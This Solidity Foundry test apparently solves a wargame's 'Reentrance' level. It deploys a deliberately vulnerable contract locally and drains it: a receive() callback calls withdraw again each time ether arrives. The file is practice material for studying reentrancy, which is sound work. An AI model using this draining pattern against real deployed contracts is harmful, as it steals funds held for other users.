// SPDX-License-Identifier: MIT
pragma solidity 0.8.17;

import "forge-std/Test.sol";
import "forge-std/console.sol";

import "../../src/10_Reentrance/Reentrance.sol";

contract ReentranceTest is Test {

    Reentrance public reentranceVictim;
    address public ownerReentrance;
    address public hackUser;

    function setUp() public {

        ownerReentrance = vm.addr(1);
        hackUser = vm.addr(2);

        vm.startPrank(ownerReentrance);

        reentranceVictim = new Reentrance();
        vm.deal(ownerReentrance, 1 ether);
        address(reentranceVictim).call{value: 1 ether}("");
        vm.stopPrank();
    }

    function test_getInitValues() public {
        assertEq(address(reentranceVictim).balance, 1 ether);
    }

    function test_hackReentrance() public {

        vm.deal(address(this), 2 ether);

        reentranceVictim.donate{value: 1 ether}(address(this));

        reentranceVictim.withdraw(1 ether);

        vm.stopPrank();

    }



    receive() external payable {

        uint256 victimBalance = address(reentranceVictim).balance;
        console.log("victimBalance: %s", victimBalance);
        console.log("address(this).balance: %s", address(this).balance);
        if (victimBalance > 0) {

            uint256 withdrawAmount = msg.value;
            //console.log(withdrawAmount);
            if (withdrawAmount > victimBalance) {
                withdrawAmount = victimBalance;
            }
            reentranceVictim.withdraw(withdrawAmount);
        }
    }

}